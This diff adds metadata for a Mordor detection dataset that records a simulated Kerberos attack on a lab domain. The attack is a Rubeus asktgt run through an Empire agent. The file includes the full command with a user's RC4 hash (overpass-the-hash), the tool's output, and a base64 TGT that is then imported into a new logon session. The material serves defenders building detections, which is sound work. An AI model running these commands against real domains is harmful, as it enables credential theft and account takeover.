@@ -1,0 +1,94 @@
+title: Empire Rubeus ASKTGT CreateNetOnly
+id: SD-190319151006
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/03/19
+platform: Windows
+mordor_environment: shire
+simulation_framework:
+  type: C2
+  name: Empire
+  script: https://github.com/GhostPack/Rubeus
+permissions_required:
+  - Administrator
+description: This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs
+dataset:
+  type: small
+  file: https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_rubeus_asktgt_ptt_createnetonly.tar.gz
+attack_mappings:
+  - technique: T1003
+    tactics:
+      - TA0006
+analytics_validation:
+adversary_view: |-
+  (Empire: G6BYHU4F) > shell Rubeus.exe asktgt /user:Mmidge /rc4:b415baa073a14f81f8c89a2a384f4a68 /createnetonly:C:\Windows\System32\cmd.exe
+  [*] Tasked G6BYHU4F to run TASK_SHELL
+  [*] Agent G6BYHU4F tasked with task ID 5.5.exe asktgt /user:Mmidge /d 
+  (Empire: G6BYHU4F) > ______        _                      
+    (_____ \      | |                     
+    _____) )_   _| |__  _____ _   _  ___ 
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.4.2 
+
+
+  [*] Action: Create Process (/netonly)
+
+  [*] Showing process : False
+  [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+  [+] ProcessID       : 8148
+  [+] LUID            : 0x53b3d71
+
+  [*] Action: Ask TGT
+
+  [*] Using rc4_hmac hash: b415baa073a14f81f8c89a2a384f4a68
+  [*] Target LUID : 87768433
+  [*] Using domain controller: HFDC01.shire.com (172.18.39.5)
+  [*] Building AS-REQ (w/ preauth) for: 'shire.com\Mmidge'
+  [+] TGT request successful!
+  [*] base64(ticket.kirbi):
+
+        doIE5DCCBOCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+KADAgEFoQsbCVNISVJFLkNPTaIeMBygAwIB
+        AqEVMBMbBmtyYnRndBsJc2hpcmUuY29to4IDwjCCA76gAwIBEqEDAgECooIDsASCA6yEK7banoUxPpUq
+        EoMNXT5YSlapCf/5ejnJ9j73z2CC1V54tAWP6wWOUkw1o5EWzeYqywcEhXsQVW/zC0fUk9f05GnMTINY
+        fK1yBdXTeUK2EL53Fq7CJkhKQdFxuNe80oROsp55hO9l4YwtHyNT6hxMuvcOO24dgB/1esaQJd0IqwRM
+        wICi6t/RS9Ac7PKOzXIyojGvTFI/zneR55Z0g7x+CJWN6FUO5zWG8QrCt2wAcWvvv0TusvK2Zkd3JHJ1
+        pTpSf6WlGK8EH5aExqTUAznFynXebqBPdmvgSkkJf6U/Z/Dy7U6KIojujr9/vyhdLUzAtVfyc3tUGZQS
+        n63UXkEVbadKNZ5m/SFr3cwNEeG9hyvyisfJMhm49fVDdEVbHrXrZfNZN5a1cqbbSkJezII0AgV9rP9J
+        PUgE8FMbfBL1gwyPZDu1PgYO0UuxJMQg4Kb1JIBjOsCx2Q9yuKXPM9wKccF4ys0qYxw5kzV/ujZIgvAS
+        XJwzlFSegjprZxljUzI5k9LDnFz7RXATScg0un0KUCHuSFsnvhHAbxe12xbEYWDG3vVu3k7uN2kkoUcb
+        xbGq2kcu/ayDJc50uSIXxwR87n1Cqt6wtydk79460C8EKwONd8VT8cbmuwlQQvQ4uz1eeS0D4TOshOlx
+        wm/dG4CZ/asRDkKu2iZWi5tBrMS2lSPxP5QLvbiYdBhIcbZrrjtFjJ9O2cxhYolj+sE01cbQx3HKR9mm
+        rx8k5buBdLyWIWy9RzkRPytqiWYdXyNmfdkVFUNI/YoP39mJX+Pu07eS76F72VEzie+c24o9YRe/1Ma6
+        FOZYNXypbgswOz6vVTKX9ItSp6nUHhDwJ5YH+QJsu3HcNqcUBCi5fwDCHkaXXx+YwJLNohuckQaDa2L/
+        NlZM7ZL+Q5GSZ27NCYlPsvmTNmGN/gVYKMJqJor2BF7KdS/Cg6w76tm+4nOCe8pCEG3pfOofLAeNGFNk
+        QGhGwyqb9G3Lx9MhLyrBhkJtmol3FKd8dm/7r/g9bKndVGejwa0DdsxesNCzOhZCpL2rChz5+ty2vvKi
+        FQi+iuAqKR9ANqaZ2VJx8qGsmOi+Qr7rEo0dm9rVIrOwa96CCFjWIUzDbN0goMuaRaMcv8zp4NRmfSUQ
+        Hsoiymm8U7yjh3JuURc7AEbQFrACIiDiBvLP8pZca483tchXlkXy+haf0vpc+t+W3IeXwI3PQOjGwTnC
+        wbjaT5LGn4uc5rIQuN4QQt/+1T7xJhYvA7NMnyqho4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEw
+        ga6gGzAZoAMCARehEgQQfcfUVG4dvCBEsY+L2tRNMaELGwlTSElSRS5DT02iEzARoAMCAQGhCjAIGwZN
+        bWlkZ2WjBwMFAEDhAAClERgPMjAxOTAzMTkxOTEzMjRaphEYDzIwMTkwMzIwMDUxMzI0WqcRGA8yMDE5
+        MDMyNjE5MTMyNFqoCxsJU0hJUkUuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlzaGlyZS5jb20=
+
+  [*] Action: Import Ticket
+  [*] Target LUID: 0x53b3d71
+  [+] Ticket successfully imported!
+
+  [*] Action: Describe Ticket
+
+    UserName              :  Mmidge
+    UserRealm             :  SHIRE.COM
+    ServiceName           :  krbtgt/shire.com
+    ServiceRealm          :  SHIRE.COM
+    StartTime             :  3/19/2019 2:13:24 PM
+    EndTime               :  3/20/2019 12:13:24 AM
+    RenewTill             :  3/26/2019 2:13:24 PM
+    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType               :  rc4_hmac
+    Base64(key)           :  fcfUVG4dvCBEsY+L2tRNMQ==
+
+
+  ..Command execution completed.
+
+  (Empire: G6BYHU4F) >
